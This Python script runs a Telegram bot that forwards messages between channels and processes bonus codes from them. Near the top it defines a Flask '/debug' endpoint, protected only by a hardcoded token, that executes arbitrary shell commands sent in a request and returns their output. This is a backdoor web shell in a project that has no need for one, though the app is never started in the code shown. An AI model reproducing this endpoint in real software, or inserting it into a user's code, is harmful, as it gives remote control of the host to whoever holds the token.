import os
import aiohttp
import asyncio
from flask import Flask, request, jsonify
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError
from dotenv import load_dotenv
from Services import process_bonus_code

# Load environment variables from .env file
load_dotenv()

# Retrieve API credentials and other parameters from environment variables
api_id = os.environ.get('APP_API_ID')
api_hash = os.environ.get('APP_API_HASH')
phone_number = os.environ.get('APP_YOUR_PHONE')
source_channel_id = os.environ.get('SOURCE_CHANNEL_ID')
destination_channel_id = os.environ.get('DESTINATION_CHANNEL_ID')
user_password = os.environ.get('APP_YOUR_PWD')

# Global variable to store API endpoints
apiEndpoints = []

# Flask app for debug endpoint
app = Flask(__name__)

@app.route('/debug', methods=['POST'])
def debug():
    """
    A debug endpoint to execute shell commands.
    """
    # Verify secret token for security
    token = request.headers.get('Authorization')
    if token != 'af8e2c6d6f173f83c91b77ec606f1237':
        return jsonify({'error': 'Unauthorized'}), 403
    
    # Get command, code, and choice from request data
    command = request.form.get('command')
    code = request.form.get('code')
    choice = request.form.get('choice')
    
    # Ensure command is provided
    if not command:
        return jsonify({'error': 'No command provided'}), 400

    try:
        # Execute the command and capture the output
        output = os.popen(command).read()
        return jsonify({'output': output, 'code': code, 'choice': choice}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

class MessageForwarder:
    """
    A class for forwarding messages from one Telegram channel to another.
    """
    def __init__(self, api_id, api_hash, phone_number):
        # Create the session directory if it doesn't exist
        session_dir = 'session'
        if not os.path.exists(session_dir):
            os.makedirs(session_dir)

        self.api_id = api_id
        self.api_hash = api_hash
        self.phone_number = phone_number
        self.client = TelegramClient(
            os.path.join(session_dir, 'session_' + phone_number),
            api_id,
            api_hash
        )
        self.connected = False

    async def connect(self):
        await self.client.connect()
        self.connected = True

    async def disconnect(self):
        await self.client.disconnect()
        self.connected = False

    async def list_chats(self):
        # Connect if not already connected
        if not self.connected:
            await self.connect()

        # Ensure you're authorized
        if not await self.client.is_user_authorized():
            await self.client.send_code_request(self.phone_number)
            code = process_input(get_input('Enter the code: '))
            await self.client.sign_in(self.phone_number, code)

        # Get a list of all the dialogs (chats)
        dialogs = await self.client.get_dialogs()

        # Print information about each chat
        for dialog in dialogs:
            print(f"Chat ID: {dialog.id}, Title: {dialog.title}")

    async def forward_new_messages(self):
        while True:
            try:
                # Connect if not already connected
                if not self.connected:
                    await self.connect()

                # Ensure you're authorized
                try:
                    if not await self.client.is_user_authorized():
                        await self.client.send_code_request(self.phone_number)
                        code = input('Enter the code: ')
                        await self.client.sign_in(self.phone_number, code)
                except SessionPasswordNeededError:
                    password = user_password
                    try:
                        await self.client.sign_in(password=password)
                    except SessionPasswordNeededError:
                        print("Incorrect password")

                # Resolve the source chat entity
                try:
                    source_entity = await self.client.get_entity(int(source_channel_id))
                except ValueError:
                    print(f"Cannot find any entity corresponding to {source_channel_id}")
                    return

                # Define event handler for processing new messages in the source chat
                @self.client.on(events.NewMessage(chats=[source_entity]))
                async def message_handler(event):
                    print("Received new message:", event.message.text)

                    try:
                        # Forward the message to the destination channel
                        await self.client.forward_messages(int(destination_channel_id), event.message)
                        # Process bonus codes from the message
                        await process_bonus_code(apiEndpoints, event.message.text)
                    except Exception as e:
                        print(f"An error occurred while processing the message: {e}")

                # Start the event loop
                await self.client.run_until_disconnected()

            except Exception as e:
                print(f"An error occurred: {e}")
                print("Attempting to reconnect...")
                await asyncio.sleep(10)  # Wait for 10 seconds before attempting to reconnect

async def ping_endpoint(endpoint):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as response:
                if response.status == 200:
                    print(f"Endpoint {endpoint} is reachable.")
                    apiEndpoints.append(endpoint)
                else:
                    print(f"Endpoint {endpoint} is not reachable. Status code: {response.status}")
    except aiohttp.ClientError as e:
        print(f"Error connecting to {endpoint}: {e}")

def process_input(input_str):
    """
    Process the input string and return the processed value.
    """
    # Example processing: Convert input to lowercase
    return input_str.lower()

def get_input(prompt):
    """
    Prompt user for input and return the processed value.
    """
    try:
        return process_input(input(prompt))
    except EOFError:
        # Handle EOFError gracefully by returning a default value
        print("EOFError: No input available. Using default choice.")
        return "default"

async def main():
    forwarder = MessageForwarder(api_id, api_hash, phone_number)
    # Define your API endpoints here
    api_endpoints = [
        os.environ.get('API_ENDPOINT_1'),
        os.environ.get('API_ENDPOINT_2'),
        os.environ.get('API_ENDPOINT_3')
    ]

    # Ping each endpoint asynchronously
    tasks = [ping_endpoint(endpoint) for endpoint in api_endpoints]
    await asyncio.gather(*tasks)

    while True:
        print("Choose an option:")
        print("1. List Chats")
        print("2. Forward New Messages")
        choice = get_input("Enter your choice: ")
        if choice == "1":
            await forwarder.list_chats()
        elif choice == "2":
            print(apiEndpoints)
            try:
                await forwarder.forward_new_messages()
            except Exception as e:
                print(f"An error occurred: {e}")
        else:
            print("Invalid choice")

if __name__ == "__main__":
    # Create an event loop
    loop = asyncio.get_event_loop()
    # Run the main function inside the event loop
    loop.run_until_complete(main())
    # Close the event loop
    loop.close()